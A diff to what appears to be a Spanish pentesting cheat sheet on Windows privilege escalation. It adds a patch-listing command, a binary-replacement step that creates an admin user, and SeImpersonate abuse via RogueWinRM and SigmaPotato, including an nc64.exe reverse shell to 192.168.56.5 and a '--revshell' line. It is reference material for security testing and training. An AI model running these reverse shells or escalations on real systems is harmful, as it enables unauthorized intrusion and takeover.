@@ -1112,6 +1112,7 @@ Get-ChildItem Env: | ft Key,Value
 
 # Parches
 wmic qfe get Caption, Description, HotFixID, InstalledOn
+Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
 
 # Actualizaciones del sistema
 wmic qfe list brief
@@ -1732,7 +1733,7 @@ Buscamos la ruta de la tarea a ejecutar y comprobamos si tenemos permisos de esc
 icacls C:\Ruta\Al\Binario\<BINARY>.exe
 ```
 
-Creamos un binario para remplazarlo. Reutilizamos el binario `adduser.exe` el cual crea y agrega un nuevo usuario a grupo administrador (esto depende del usuario que este ejecutando la tarea) o también podemos lanzarnos una reverse shell.
+Reutilizamos el binario `adduser.exe` el cual crea y agrega un nuevo usuario al grupo administrador (esto depende del usuario que este ejecutando la tarea) o también podemos lanzarnos una reverse shell.
 
 ```c
 #include <stdlib.h>
@@ -1758,6 +1759,29 @@ Movemos el binario a la ruta del binario original para remplazarlo.
 
 ```powershell
 move .\<BINARY>.exe C:\Ruta\Al\Binario\
+```
+
+##### SeImpersonate y SeAssignPrimaryToken
+
+###### RogueWinRM.exe
+
+> https://github.com/antonioCoco/RogueWinRM
+
+```powershell
+RogueWinRM.exe -p C:\windows\temp\nc64.exe -a "192.168.56.5 4000 -e cmd"
+```
+
+###### SigmaPotato.exe
+
+> https://github.com/tylerdotrar/SigmaPotato
+
+```powershell
+# Ejecutar un comando
+./SigmaPotato.exe <command>
+
+
+# Establecer una reverse shell con PowerShell
+./SigmaPotato.exe --revshell <ip_addr> <port>
 ```
 
 ###  9.2. <a name='linux-2'></a>Linux
@@ -1851,6 +1875,7 @@ Enlaces a las distintas herramientas y recursos.
 | Winpeas  | https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS |
 | Seatbelt | https://github.com/GhostPack/Seatbelt                    |
 | Linpeas  | https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS |
+| SigmaPotato | https://github.com/tylerdotrar/SigmaPotato |
 
 ###  11.8. <a name='recursos-y-blogs'></a>Recursos y Blogs
 
